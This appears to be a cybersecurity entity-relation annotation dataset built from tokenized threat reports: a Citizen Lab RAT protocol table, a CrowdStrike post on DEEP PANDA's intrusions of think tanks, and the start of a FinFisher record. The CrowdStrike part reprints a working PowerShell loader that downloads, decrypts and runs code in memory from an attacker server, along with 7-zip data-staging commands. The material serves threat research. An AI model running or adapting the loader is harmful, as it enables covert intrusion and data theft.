"Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["28"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0xA3"], ["Set", "registry", "key", "type"], ["and", "value"], ["S"], ["Sets", "a", "registry", "key", "type", "and", "value", "."], ["Packet", "always", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "value", "name", "length"], ["[var]", "-", "Registry", "value", "name"], ["[4]", "-", "Registry", "value", "type"], ["The", "value", "then", "can", "take", "a", "different", "form", "based", "on", "the", "value", "type", "."], ["Value", "type", "0", "(empty):"], ["No", "payload", "."], ["Value", "type", "1", "(REG_SZ", ",", "null", "terminated", "string):"], ["[4]", "-", "Registry", "value", "length"], ["[var]", "-", "Registry", "value"], ["Value", "type", "3", "(REG_BINARY", ",", "raw", "binary", "data):"], ["[4]", "-", "Registry", "value", "length"], ["[var]", "-", "Registry", "value"], ["Value", "type", "4", "(REG_DWORD", ",", "double", "word):"], ["[4]", "-", "Registry", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xA4"], ["NOP"], ["S"], ["Does", "nothing", ".", "Possibly", "an", "unimplemented", "or", "deleted", "function", "."], ["0xA5"], ["Delete", "registry", "key"], ["S"], ["Deletes", "a", "registry", "key", ".", "Can", "be", "a", "subkey", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xB6"], ["Keylogger", "response"], ["C"], ["Sends", "keylogger", "data", "from", "the", "keylogger", "buffer", "file", "."], ["Keylogger", "data:"], ["[4]", "-", "Length"], ["[1]", "-", "All", "bytes", "read", "?", "1", "or", "0"], ["[var]", "-", "Keylogger", "data"], ["Parameters", "are", "set", "to", "the", "output", "of", "function", "4", "in", "the", "class", "C", "vtable", "?"], ["0xB8"], ["Keylogger", "data", "request"], ["S"], ["Requests", "keylogger", "data", "in", "a", "0xB6", "packet", "."], ["29"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0xC8"], ["Unknown", "-", "get", "a", "screenshot", "?"], ["S"], ["30"], ["Looks", "suspiciously", "like", "taking", "a", "screenshot", "."], ["Packet", "contains:"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[1]", "-", "Unknown"], ["Replies", "with", "failure", "or", "success", "with", "parameters", "8/8", ".", "If", "success", ",", "contains", "the"], ["following", "fields:"], ["[2]", "-", "Monitor", "width", "size", "(X)", "in", "pixels"], ["[2]", "-", "Monitor", "height", "size", "(Y)", "in", "pixels"], ["[4]", "-", "Unknown"], ["[4]", "-", "Unknown", "size", "(screenshot", "?", ")"], ["[var]", "-", "Unknown", "(screenshot", "?", ")"], ["0xCA"], ["Send", "keyboard", "or"], ["mouse", "event"], ["S"], ["Packet", "contains:"], ["[4]", "-", "Unknown"], ["[4]", "-", "Extra", "information", "for", "keybd_event", "or", "mouse_event"], ["[4]", "-", "Flags", "for", "keybd_event", "or", "mouse_event"], ["[4]", "-", "Vk", "for", "keybd_event"], ["[4]", "-", "x", "coordinate", "for", "mouse", "or", "Vk", "for", "keyboard"], ["[4]", "-", "y", "coordinate", "for", "mouse"], ["[4]", "-", "Data", "for", "mouse", "event"], ["0xCB"], ["Downloads", "a", "file"], ["S"], ["Downloads", "a", "file", "to", "%temp%\\off", ".", "dll."], ["Packet", "contains:"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[4]", "-", "Data", "length"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["[4]", "-", "File", "data", "length"], ["[var]", "-", "File", "data"], ["Writes", "log", "information", "on", "the", "size", "of", "the", "downloaded", "file", "to", "c:\\aaa\\ccc", ".", "txt."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "CrowdStrike", "sent_id": 8, "pos": [5]}, {"old_id": "T2", "type": "Organization", "name": "CrowdStrike", "sent_id": 35, "pos": [0]}, {"old_id": "T3", "type": "Software", "name": "Falcon Host", "sent_id": 35, "pos": [4, 5]}, {"old_id": "T4", "type": "Software", "name": "Falcon Host", "sent_id": 41, "pos": [2, 3]}, {"old_id": "T5", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 43, "pos": [3, 4]}, {"old_id": "T6", "type": "Organization", "name": "CrowdStrike", "sent_id": 45, "pos": [0]}, {"old_id": "T7", "type": "Address", "name": "DEEP PANDA", "sent_id": 45, "pos": [3, 4]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "government defense financial legal and the telecommunications industries", "sent_id": 46, "pos": []}, {"old_id": "T9", "type": "Software", "name": "Falcon Host", "sent_id": 48, "pos": [3, 4]}, {"old_id": "T10", "type": "Software", "name": "Falcon Host", "sent_id": 51, "pos": [4, 5]}, {"old_id": "T11", "type": "Information", "name": "Southeast Asia policy information", "sent_id": 55, "pos": [0, 3]}, {"old_id": "T12", "type": "Software", "name": "Falcon Host", "sent_id": 73, "pos": [1, 2]}, {"old_id": "T13", "type": "Exploit", "name": "powershell scripts", "sent_id": 84, "pos": [0, 1]}, {"old_id": "T14", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 90, "pos": [0, 1]}, {"old_id": "T15", "type": "Obfuscation", "name": "base64", "sent_id": 91, "pos": [7]}, {"old_id": "T16", "type": "Payload", "name": "Wafer", "sent_id": 155, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "MadHatter NET", "sent_id": 160, "pos": [3, 6]}, {"old_id": "T18", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 161, "pos": [5, 6]}, {"old_id": "T19", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 163, "pos": [10, 11]}, {"old_id": "T20", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 167, "pos": [5, 6]}, {"old_id": "T21", "type": "Exploit", "name": "powershell scripts", "sent_id": 173, "pos": [0, 1]}, {"old_id": "T22", "type": "Exploit", "name": "Cult of the Dead Cow\u2019s NetE", "sent_id": 175, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "cftmonexe", "sent_id": 201, "pos": []}, {"old_id": "T24", "type": "Password", "name": "uinfw", "sent_id": 203, "pos": []}, {"old_id": "T25", "type": "Exploit", "name": "WMI", "sent_id": 206, "pos": [6]}, {"old_id": "T26", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 221, "pos": [0, 1]}, {"old_id": "T27", "type": "ExploitTargetObject", "name": "multinational financial institutions", "sent_id": 222, "pos": [4, 6]}, {"old_id": "T28", "type": "ExploitTargetObject", "name": "law firms", "sent_id": 222, "pos": [8, 9]}, {"old_id": "T29", "type": "ExploitTargetObject", "name": "defense contractors", "sent_id": 223, "pos": [0, 1]}, {"old_id": "T30", "type": "ExploitTargetObject", "name": "government agencies", "sent_id": 223, "pos": [4, 5]}, {"old_id": "T31", "type": "Software", "name": "Falcon Host", "sent_id": 227, "pos": [2, 3]}, {"old_id": "T32", "type": "Software", "name": "Falcon Host", "sent_id": 227, "pos": [2, 3]}], "labels": [{"old_id": "R1", "r": "P17", "h": 1, "t": 2, "evidence": [35]}, {"old_id": "R2", "r": "P2", "h": 13, "t": 12, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 12, "t": 14, "evidence": [84, 85, 86, 87, 88, 89, 90, 91]}, {"old_id": "R4", "r": "P2", "h": 17, "t": 16, "evidence": []}, {"old_id": "R5", "r": "P2", "h": 19, "t": 20, "evidence": [167, 168, 169, 170, 171, 172, 173]}], "title": ["inputs/txt/201407CrowdStrikeDeepPanda"], "sents": [["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Deep", "in", "Thought:", "Chinese"], ["Targeting", "of", "National", "Security"], ["Think", "Tanks"], ["July", "7", ",", "2014"], ["Dmitri", "Alperovitch"], ["Executive", "Viewpoint"], ["For", "some", "time", "now", ",", "CrowdStrike", "has", "been", "working", "with", "a"], ["number", "of", "national", "security", "think", "tanks", "and", "human", "rights"], ["organizations", "on", "a", "pro", "bono", "basis", "to", "help", "them", "with", "their"], ["security", "posture", ".", "These", "organizations", "face", "some", "of", "the", "most"], ["advanced", "nation-state", "adversaries", "\u2014", "China", ",", "Russia", ",", "and", "Iran", ","], ["just", "to", "name", "a", "few", ".", "The", "individuals", "who", "are", "typically", "targeted", "at"], ["these", "institutions", "tend", "to", "be", "former", "senior", "government", "officials"], ["who", "still", "have", "lots", "of", "contacts", "within", "Western", "governments", "and", ","], ["as", "such", ",", "their", "private", "correspondence", "is", "of", "extreme", "interest", "to"], ["these", "attackers", ".", "The", "intelligence", "services", "of", "these", "nation", "states"], ["are", "always", "on", "the", "lookout", "for", "any", "clues", "they", "may", "extract", "from"], ["such", "private", "communications", "that", "may", "give", "them", "an", "advanced"], ["insight", "into", "what", "options", "government", "policy", "makers", "are"], ["considering", "on", "particular", "issues", "of", "interest", ".", "At", "the", "same", "time", ","], ["with", "access", "to", "the", "victim", "email", "mailboxes", ",", "the", "adversaries", "can"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["1/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["craft", "very", "realistic", "spear-phishing", "lures", "to", "the", "government"], ["contacts", "of", "targeted", "think", "tank", "personnel", "by", "piggybacking", "on"], ["ongoing", "real", "conversations", "and", "increasing", "their", "chances", "of", "a"], ["successful", "compromise", "of", "an", "official", "government", "email", "account", "."], ["Despite", "this", "high", "threat", "level", ",", "these", "think", "tanks", "are", "organized", "as"], ["non-profits", "and", "often", "do", "not", "have", "the", "budgets", "of", "commercial"], ["organizations", "to", "afford", "cutting-edge", "security", "technologies", "that"], ["can", "help", "them", "effectively", "detect", "these", "threats", ".", "For", "this", "reason", ","], ["CrowdStrike", "has", "provided", "our", "Falcon", "Host", "endpoint", "security"], ["technology", "to", "many", "of", "these", "organizations", "at", "no", "charge", "to", "them"], ["to", "help", "detect", "and", "attribute", "these", "attackers", "on", "their", "networks", "in"], ["real", "time", ",", "as", "well", "as", "to", "receive", "instantaneous", "full", "forensic"], ["visibility", "into", "their", "behavior", "to", "help", "with", "full", "remediation", "of", "any"], ["incident", "."], ["Recently", ",", "Falcon", "Host", "has", "detected", "multiple", "simultaneous"], ["compromises", "at", "several", "national", "security", "think", "tanks", "from", "an"], ["actor", "we", "call", "DEEP", "PANDA", ",", "one", "of", "the", "most", "advanced", "Chinese"], ["nation-state", "cyber", "intrusion", "groups", ".", "For", "almost", "three", "years", "now", ","], ["CrowdStrike", "has", "monitored", "DEEP", "PANDA", "targeting", "critical", "and"], ["strategic", "business", "verticals", "including:", "government", ",", "defense", ","], ["financial", ",", "legal", ",", "and", "the", "telecommunications", "industries", ".", "At", "the"], ["think", "tanks", ",", "Falcon", "Host", "detected", "targeting", "of", "senior", "individuals"], ["involved", "in", "geopolitical", "policy", "issues", ",", "in", "particular", "in", "the"], ["China/Asia", "Pacific", "region", ".", "However", ",", "last", "week", "the", "unprecedented"], ["real-time", "visibility", "provided", "by", "Falcon", "Host", "into", "this", "actor\u2019s"], ["escapades", "allowed", "analysts", "to", "observe", "a", "radical", "change", "in"], ["targeting", "."], ["This", "actor", ",", "who", "was", "engaged", "in", "targeting", "and", "collection", "of"], ["Southeast", "Asia", "policy", "information", ",", "suddenly", "began", "targeting"], ["individuals", "with", "a", "tie", "to", "Iraq/Middle", "East", "issues", ".", "This", "is"], ["undoubtedly", "related", "to", "the", "recent", "Islamic", "State", "of", "Iraq", "and", "the"], ["Levant", "(ISIS)", "takeover", "of", "major", "parts", "of", "Iraq", "and", "the", "potential"], ["disruption", "for", "major", "Chinese", "oil", "interests", "in", "that", "country", ".", "In", "fact", ","], ["Iraq", "happens", "to", "be", "the", "fifth-largest", "source", "of", "crude", "oil", "imports"], ["for", "China", "and", "the", "country", "is", "the", "largest", "foreign", "investor", "in", "Iraq\u2019s"], ["oil", "sector", ".", "Thus", ",", "it", "wouldn\u2019t", "be", "surprising", "if", "the", "Chinese"], ["government", "is", "highly", "interested", "in", "getting", "a", "better", "sense", "of", "the"], ["possibility", "of", "deeper", "U", ".", "S.", "military", "involvement", "that", "could", "help"], ["protect", "the", "Chinese", "oil", "infrastructure", "in", "Iraq", ".", "In", "fact", ",", "the", "shift", "in"], ["targeting", "of", "Iraq", "policy", "individuals", "occurred", "on", "June", "18", ",", "the", "day"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["2/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["that", "ISIS", "began", "its", "attack", "on", "the", "Baiji", "oil", "refinery", "."], ["The", "Attacks"], ["CrowdStrike\u2019s", "Falcon", "Host", "technology", "used", "by", "these", "think", "tanks"], ["consists", "of", "a", "tiny", "(under", "5mb", "in", "size)", "kernel", "sensor", "that", "is"], ["deployed", "on", "Windows", "and", "Mac", "servers", ",", "desktops", ",", "and", "laptops"], ["and", "is", "able", "to", "do", "real-time", "detection", "and", "recording", "of", "all"], ["adversary", "activities", "taking", "place", "on", "the", "system", ".", "In", "addition", ",", "by"], ["matching", "the", "detected", "activities", "against", "our", "vast", "Adversary"], ["Intelligence", "repository", ",", "Falcon", "Host", "can", "automatically", "attribute"], ["the", "attack", "to", "a", "known", "adversary", "group", "and", "provide", "details", "about"], ["their", "motivations", ",", "capabilities", ",", "and", "key", "Tactics", ",", "Techniques", ",", "and"], ["Procedures", "(TTPs)", "."], ["Recently", ",", "we", "detected", "breaches", "of", "these", "networks", "via", "the", "use", "of"], ["powershell", "scripts", "deployed", "by", "the", "adversary", "as", "scheduled", "tasks"], ["on", "Windows", "machines", ".", "The", "scripts", "are", "passed", "to", "the", "powershell"], ["interpreter", "through", "the", "command", "line", "to", "avoid", "placement", "of"], ["extraneous", "files", "on", "the", "victim", "machine", "that", "could", "potentially"], ["trigger", "AV-", "or", "Indicator", "of", "Compromise", "(IOC)-based", "detection", "."], ["The", "scripts", "were", "scheduled", "to", "call", "back", "every", "two", "hours", "to", "the"], ["DEEP", "PANDA", "Command", "and", "Control", "(C2)", "infrastructure", "."], ["The", "script", "in", "the", "command", "line", "is", "base64", "encoded", ",", "but", "when"], ["decoded", "it", "translates", "to", "the", "following", "code", "snippet:"], ["[System", ".", "Net.ServicePointManager]::ServerCertificateValidationCallback"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["3/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["=", "{$true}"], ["$wc", "=", "New\u00adObject", "\u00adTypeName", "System", ".", "Net.WebClient"], ["$wc", ".", "Headers.Add(\u201cAccept\u00adLanguage\u201d,", "\u201cen\u00ad"], ["US,en\u037eq=0", ".", "\u201d", "+", "([IntPtr]::Size", "\u2013", "1)", ".", "ToString())"], ["$wc", ".", "Headers.Add(\u201cUser\u00adAgent\u201d,", "\u201cMozilla/5", ".", "0"], ["(compatible\u037e", "MSIE", "10", ".", "0\u037e", "Windows", "NT", "6", ".", "1\u037e", "WOW64\u037e"], ["Trident/6", ".", "0)\u201d)"], ["$rndn", "=", "Get\u00adRandom"], ["$wc", ".", "Headers.Add(\u201cCookie\u201d,", "\u201cp=\u201d", "+", "$rndn)"], ["$data", "="], ["$wc", ".", "DownloadData(\u201chttps://<ANONYMIZED>/config/oauth/\u201d)"], ["[string[]]$xags", "="], ["\u201chttps://<ANONYMIZED>/config/login/\u201d", ","], ["\u201cWMITool", ".", "Program\u201d,", "\u201cMain\u201d", ",", "\u201c/f\u201d", ",", "\u201cssh\u201d", ",", "\u201c/s\u201d", ","], ["\u201c<ANONYMIZED>\u201d", ",", "\u201c/p\u201d", ",", "\u201c443\u201d"], ["$Passphrase", "=", "\u201c<ANONYMIZED>\u201d"], ["$salts", "=", "\u201c<ANONYMIZED>\u201d"], ["$r", "=", "new\u00adObject"], ["System", ".", "Security.Cryptography.RijndaelManaged"], ["$pass", "="], ["[System", ".", "Text.Encoding]::UTF8.GetBytes($Passphrase)"], ["$salt", "="], ["[System", ".", "Text.Encoding]::UTF8.GetBytes($salts)"], ["$r", ".", "Key", "=", "(new\u00adObject"], ["Security", ".", "Cryptography.PasswordDeriveBytes", "$pass", ","], ["$salt", ",", "\u201cSHA1\u201d", ",", "5)", ".", "GetBytes(32)", "#256/8"], ["$r", ".", "IV", "=", "(new\u00adObject"], ["Security", ".", "Cryptography.SHA1Managed).ComputeHash("], ["[Text", ".", "Encoding]::UTF8.GetBytes($rndn)", ")[0", ".", ".15]"], ["$d", "=", "$r", ".", "CreateDecryptor()"], ["$ms", "=", "new\u00adObject", "IO", ".", "MemoryStream", "@(", ",", "$data)"], ["$cs", "=", "new\u00adObject"], ["Security", ".", "Cryptography.CryptoStream", "$ms", ",", "$d,\u201dRead\u201d"], ["$dfs", "=", "New\u00adObject"], ["System", ".", "IO.Compression.GzipStream", "$cs", ","], ["([IO", ".", "Compression.CompressionMode]::Decompress)"], ["$msout", "=", "New\u00adObject", "System", ".", "IO.MemoryStream"], ["[byte[]]$buffer", "=", "new\u00adobject", "byte[]", "4096"], ["[int]$count", "=", "0"], ["do"], ["{"], ["$count", "=", "$dfs", ".", "Read($buffer,", "0", ",", "$buffer", ".", "Length)"], ["$msout", ".", "Write($buffer,", "0", ",", "$count)"], ["}", "while", "($count", "\u00adgt", "0)"], ["$dfs", ".", "Close()"], ["$cs", ".", "Close()"], ["$ms", ".", "Close()"], ["$r", ".", "Clear()"], ["[byte[]]$bin", "=", "$msout", ".", "ToArray()"], ["$al", "=", "New\u00adObject", "\u00adTypeName"], ["System", ".", "Collections.ArrayList"], ["$al", ".", "Add($xags)"], ["$asm", "=", "[System", ".", "Reflection.Assembly]::Load($bin)"], ["$asm", ".", "EntryPoint.Invoke($null,", "$al", ".", "ToArray())"], ["sleep", "5"], ["Exit"], ["Once", "executed", ",", "it", "downloads", "and", "executes", "from", "memory", "a", "", ".", "NET"], ["executable", "(typically", "named", "Wafer)", ",", "which", "in", "turn", "typically"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["4/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["downloads", "and", "runs", "MadHatter", "", ".", "NET", "Remote", "Access", "Tool", "(RAT)", ","], ["one", "of", "the", "favorites", "of", "DEEP", "PANDA", ".", "By", "running", "them", "from"], ["memory", ",", "it", "leaves", "no", "disk", "artifacts", "or", "host-based", "IOCs", "that", "can"], ["be", "identified", "in", "forensic", "analysis", ".", "This", "is", "typical", "for", "DEEP", "PANDA"], ["\u2014", "stealth", "is", "their", "specialty", "and", "they", "prefer", "to", "operate", "in", "a", "way"], ["that", "leaves", "a", "minimal", "footprint", "on", "a", "victim", "system", "and", "often"], ["allows", "them", "to", "evade", "detection", "for", "a", "very", "long", "time", "."], ["For", "this", "same", "reason", ",", "DEEP", "PANDA", "likes", "to", "use", "webshells", "to", "keep"], ["low-footprint", "persistent", "access", "to", "the", "victim", "network", ",", "as", "we\u2019ve"], ["covered", "in", "our", "prior", "blogs", ".", "This", "case", "was", "no", "exception", ",", "and", "that"], ["initial", "webshell", "implant", "allowed", "them", "to", "execute", "reconnaissance"], ["commands", "such", "as", "\u201ctasklist", ",", "\u201d", "\u201cnet", "view", ",", "\u201d", "and", "\u201cnet"], ["localgroup", "administrators", ",", "\u201d", "and", "then", "afterward", "to", "deploy", "the"], ["powershell", "scripts", "."], ["The", "adversary", "used", "stolen", "credentials", "to", "mount", "network", "shares"], ["via", "\u201cnet", "use\u201d", "command", ".", "In", "one", "case", ",", "they", "brought", "in", "Cult", "of"], ["the", "Dead", "Cow\u2019s", "NetE", "tool", "onto", "the", "system", ",", "but", "most", "of", "the", "time"], ["they", "leveraged", "existing", "Windows", "tools", "and", "avoided", "bringing"], ["many", "new", "tools", "into", "the", "environment", "that", "could", "make", "them"], ["noisy", "and", "easily", "detectable", "by", "technologies", "that", "scan", "for", "static"], ["IOCs", "."], ["After", "using", "compromised", "credentials", "to", "mount", "file", "shares", ",", "the"], ["adversary", "was", "seen", "compressing", "data", "using", "7-zip", ".", "They", "were"], ["adding", "different", "document", "types", "to", "compressed", "files", "by"], ["wildcarding", "the", "extensions", ",", "such", "as:"], ["\u201cC:Program", "Files7\u00adZip7z\u201d", "a", "setup1", ".", "log", "\u00adr", "\u00adpkkk***"], ["\u201c\\<share", "name>users<UserName>*rtf", "*doc\u201d"], ["\u201cC:Program", "Files7\u00adZip7z\u201d", "a", "setup1", ".", "log", "\u00adr", "\u00adpkkk***"], ["\u201c\\<share", "name>users<UserName>*ppt\u201d"], ["They", "knew", "exactly", "which", "users", "to", "target", "based", "on", "their", "research"], ["policy", "area", ",", "and", "they", "rapidly", "pivoted", "from", "China/Asia", "Pacific"], ["policy", "experts", "to", "Iraq/Middle", "East", "policy", "experts", "once", "their"], ["tasking", "collection", "requirements", "changed", "."], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["5/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Aggressive", "Use", "of", "Ping", "to", "Determine", "Which", "Machines", "of", "Interest"], ["are", "Online"], ["On", "one", "of", "the", "compromised", "machines", ",", "the", "adversary", "brought", "in"], ["a", "command-line", "version", "of", "RAR", "archiver", "that", "was", "named"], ["\u201ccftmon", ".", "exe\u201d", "and", "placed", "it", "into", "\u201cc:windowstemphotfix\u201d"], ["directory", ".", "The", "files", "were", "encrypted", "(both", "file", "data", "and", "headers)"], ["with", "\u201cuinfw\u201d", "password", "and", "the", "archive", "files", "were", "named", "after"], ["the", "initials", "of", "each", "user", "that", "had", "been", "targeted", "and", "stored", "in", "the"], ["same", "\u201cc:windowstemphotfix\u201d", "directory", "."], ["For", "lateral", "movement", ",", "they", "used", "WMI", "to", "deploy", "the", "powershell"], ["scripts", "remotely", "and", "setup", "scheduled", "tasks", "on", "the", "remote"], ["systems", "."], ["\ue600"], ["BLOG"], ["Despite", "the", "fact", "that", "we", "were", "seeing", "nearly", "identical", "TTPs", "used"], ["across", "multiple", "think-tank", "targets", ",", "there", "is", "evidence", "to", "indicate"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["6/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["that", "these", "operations", "had", "different", "individuals", "behind", "the"], ["keyboard", "based", "on", "the", "intricacies", "of", "how", "certain", "powershell"], ["command", "lines", "had", "been", "used", "in", "each", "case", "."], ["Summary"], ["DEEP", "PANDA", "presents", "a", "very", "serious", "threat", "not", "just", "to", "think"], ["tanks", ",", "but", "also", "multinational", "financial", "institutions", ",", "law", "firms", ","], ["defense", "contractors", ",", "and", "government", "agencies", ".", "Due", "to", "their"], ["stellar", "operational", "security", "and", "reliance", "on", "anti-forensic", "and"], ["anti-IOC", "detection", "techniques", ",", "detecting", "and", "stopping", "them", "is"], ["very", "challenging", "without", "the", "use", "of", "next-generation", "endpoint"], ["technology", "like", "Falcon", "Host", ".", "Not", "only", "was", "Falcon", "Host", "able", "to"], ["detect", "this", "adversary", "without", "relying", "on", "static", "signatures", "or"], ["IOCs", ",", "but", "it", "was", "able", "to", "provide", "instantaneous", "and", "full", "forensic"], ["analysis", "of", "what", "had", "occurred", "on", "each", "of", "the", "compromised"], ["endpoints", "without", "the", "need", "to", "pull", "hard", "drives", "and", "do", "costly", "and"], ["time-intensive", "forensics", ",", "substantially", "reducing", "the", "time", "needed"], ["for", "remediation", "."], ["If", "you", "are", "a", "non-profit", "think", "tank", "or", "a", "human", "rights", "organization"], ["that", "would", "like", "to", "take", "advantage", "of", "our", "no-charge", "offer", "of", "Falcon"], ["Host", "licenses", "for", "your", "servers", "and", "desktops", ",", "please", "email", "us", "at"], ["sales@crowdstrike", ".", "com", "with", "the", "subject", "\u201cNon-Profit", "Falcon"], ["Host", "Offer", ".", "\u201d"], ["Our", "Falcon", "Intelligence", "subscribers", "have", "had", "access", "to", "multiple"], ["reports", "on", "the", "DEEP", "PANDA", "actor", "that", "includes", "full", "analysis", "of"], ["their", "attribution", ",", "tradecraft", "and", "TTPs", ",", "as", "well", "as", "detection"], ["\uf077"], ["indicators", "and", "signatures", "and", "remediation", "instructions", ".", "And", "our"], ["CrowdStrike", "Services", "has", "worked", "on", "multiple", "intrusion"], ["investigations", "related", "to", "DEEP", "PANDA", "in", "the", "last", "year", ".", "If", "you"], ["would", "also", "like", "to", "see", "a", "demo", "of", "Falcon", "Host", "or", "Falcon"], ["Intelligence", "in", "action", "or", "discuss", "our", "Services", "offerings", ",", "please"], ["contact", "our", "Sales", "Team", "to", "schedule", "a", "personal", "briefing", "."], ["Stay", "safe", "and", "keep", "a", "watchful", "eye", "on", "the", "Pandas", ",", "Bears", ",", "Kittens", ","], ["and", "other", "adversaries", "who", "are", "relentlessly", "preying", "on", "your", "data", "!"], ["\uf099", "Tweet"], ["\uf0e1", "Share"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["7/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Dmitri", "Alperovitch"], ["Co-founder", "and", "CTO", "of", "Crowdstrike", ",", "Dmitri", "Alperovitch"], ["leads", "the", "Intelligence", ",", "Technology", "and", "CrowdStrike", "Labs"], ["teams", ".", "Alperovitch", "has", "invented", "18", "patented"], ["technologies", "and", "has", "conducted", "extensive", "research", "on"], ["reputation", "systems", ",", "spam", "detection", ",", "web", "security", ","], ["public-key", "and", "identity-based", "cryptography", ",", "malware"], ["and", "intrusion", "detection/prevention", ".", "He", "is", "a", "renowned"], ["computer", "security", "researcher", "and", "thought", "leader", "on"], ["cybersecurity", "policies", "and", "state", "tradecraft", "."], ["Alperovitch\u2019s", "many", "honors", "include", "being", "selected", "as"], ["MIT", "Technology", "Review\u2019s", "\u201cYoung", "Innovators", "under"], ["35\u201d", "(TR35)", "in", "2013", ".", "He", "also", "was", "named", "Foreign", "Policy"], ["Magazine\u2019s", "Leading", "Global", "Thinker", "for", "2013", "and"], ["received", "a", "Federal", "100", "Award", "for", "his", "information"], ["security", "contributions", "."], ["Related", "Content"], ["U", ".", "S.", "\u2013", "China"], ["Agreement", "on"], ["Cyber"], ["Intrusions:", "An"], ["Inflection"], ["Point"], ["Are", "You", "More"], ["Interested", "in"], ["Stopping", "a"], ["Breach", "or"], ["Stopping"], ["Malware", "?"], ["VENOM"], ["Vulnerability:"], ["Community"], ["Patching", "and"], ["Mitigation"], ["Update"], ["Chinese"], ["This", "is", "a"], ["Today", ","], ["economic"], ["question", "I", "ask", "a"], ["CrowdStrike"], ["espionage"], ["lot", "of"], ["disclosed", "a"], ["reached", "its"], ["organizations"], ["critical", "virtual"], ["boiling", "point"], ["that", "I", "speak", "with", "."], ["machine", "escape"], ["some", "time", "ago", ","], ["While", "the\u2026"], ["vulnerability"], ["and", "has", "been"], ["(which", "we", "named"], ["scalding"], ["VENOM)"], ["industries"], ["discovered", "by"], ["throughout\u2026"], ["our\u2026"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["8/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["\ue603"], ["Copyright", "\u00a9", "2016", "CrowdStrike", "|"], ["Privacy", "|"], ["\uf099"], ["Request", "Info", "|"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["Blog", "|"], ["Contact", "Us", "|"], ["\uf0e1"], ["\uf09a"], ["\uf16a"], ["1", ".", "888.512.8906"], ["9/9"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "The Citizen Lab", "sent_id": 2, "pos": [0, 2]}, {"old_id": "T3", "type": "Organization", "name": "Gamma International UK Ltd", "sent_id": 7, "pos": [9, 12]}, {"old_id": "T2", "type": "Software", "name": "FinFisher Suite", "sent_id": 7, "pos": [1, 2]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "Bahraini pro-democracy activists", "sent_id": 14, "pos": [3, 5]}, {"old_id": "T5", "type": "Time", "name": "April", "sent_id": 14, "pos": [7]}, {"old_id": "T6", "type": "Time", "name": "May", "sent_id": 14, "pos": [9]}, {"old_id": "T7", "type": "Person", "name": "Vernon Silver", "sent_id": 13, "pos": [11, 12]}, {"old_id": "T8", "type": "Organization", "name": "Bloomberg News", "sent_id": 13, "pos": [14, 15]}, {"old_id": "T9", "type": "Malware", "name": "Finspy", "sent_id": 20, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "Bahraini activists", "sent_id": 26, "pos": [8, 9]}, {"old_id": "T11", "type": "Country", "name": "Bahrain", "sent_id": 27, "pos": [8]}, {"old_id": "T12", "type": "ThreatActor", "name": "Melissa Chan", "sent_id": 31, "pos": []}, {"old_id": "T13", "type": "Organization", "name": "Aljazeera English", "sent_id": 31, "pos": [10, 11]}, {"old_id": 